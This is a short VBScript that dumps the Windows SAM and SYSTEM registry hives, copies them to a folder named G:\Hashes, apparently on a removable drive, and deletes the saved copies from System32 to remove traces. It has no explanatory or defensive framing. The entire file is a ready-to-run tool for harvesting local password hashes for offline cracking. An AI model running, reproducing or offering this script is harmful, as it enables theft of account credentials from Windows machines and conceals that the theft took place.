 Set WshShell = CreateObject("WScript.Shell")
                                                                             
 ' Save the SAM registry hive
 WshShell.Exec "cmd.exe /c reg save HKLM\sam C:\Windows\System32\sam.save"
                                                                            
 ' Save the SYSTEM registry hive
 WshShell.Exec "cmd.exe /c reg save HKLM\system C:\Windows\System32\system.save"
                                                                             
 ' Wait for the previous commands to complete
 WScript.Sleep 1000
                                                                             
 ' Copy the saved files to G:\
 WshShell.Exec "cmd.exe /c copy C:\Windows\System32\sam.save G:\Hashes\ /Y"
 WshShell.Exec "cmd.exe /c copy C:\Windows\System32\system.save G:\Hashes\ /Y"
                                                                            
 ' Clean up by deleting the saves from C:\Windows\System32
 WshShell.Exec "cmd.exe /c del C:\Windows\System32\sam.save"
 WshShell.Exec "cmd.exe /c del C:\Windows\System32\system.save"